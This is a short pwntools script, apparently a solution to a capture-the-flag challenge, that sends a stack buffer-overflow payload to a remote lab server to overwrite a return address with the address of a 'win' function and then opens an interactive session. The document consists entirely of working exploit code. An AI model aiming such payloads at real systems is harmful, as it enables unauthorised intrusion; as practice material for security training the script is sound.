from pwn import *
#p = process('./vuln')
p = remote('xebec.cylabacademy.net', 18697)
win = 0x080491e6
payload = b'a' * 0x70 + b'b'*4 + p32(win)
p.sendafter(b': ', payload)
p.interactive()
